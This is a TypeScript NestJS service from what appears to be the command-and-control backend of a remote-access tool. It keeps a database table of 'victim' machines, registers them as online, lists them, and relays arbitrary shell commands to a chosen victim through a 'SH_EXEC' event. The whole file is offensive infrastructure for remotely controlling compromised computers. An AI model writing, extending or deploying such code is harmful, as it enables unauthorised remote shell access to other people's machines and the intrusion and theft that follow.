import {
  ConflictException,
  Injectable,
  NotFoundException,
} from '@nestjs/common';
import { PrismaService } from 'src/prisma/prisma.service';
import { InitMachineDto } from './dtos/main';
import { EventsGateway } from 'src/events/events.gateway';
import { victim } from '@prisma/client';

@Injectable()
export class MachinesService {
  constructor(
    private readonly prisma: PrismaService,
    private readonly eventsGateway: EventsGateway,
  ) {}

  async init(payload: InitMachineDto): Promise<boolean> {
    await this.prisma.victim.upsert({
      where: {
        machine_id: payload.machine_id,
      },
      update: { ...payload, state: 'Online' },
      create: { ...payload, state: 'Online' },
    });
    return true;
  }

  async execute(machine_id: string, command: string): Promise<boolean> {
    const machine = await this.prisma.victim.findUnique({
      where: { machine_id },
      select: { state: true },
    });
    if (!machine) throw new NotFoundException('Machine not found');
    if (machine.state === 'Offline')
      throw new ConflictException('Machine is offline');
    return await this.eventsGateway.emit__SH_EXEC__(machine_id, command);
  }

  async findAll(): Promise<victim[]> {
    return await this.prisma.victim.findMany();
  }
}
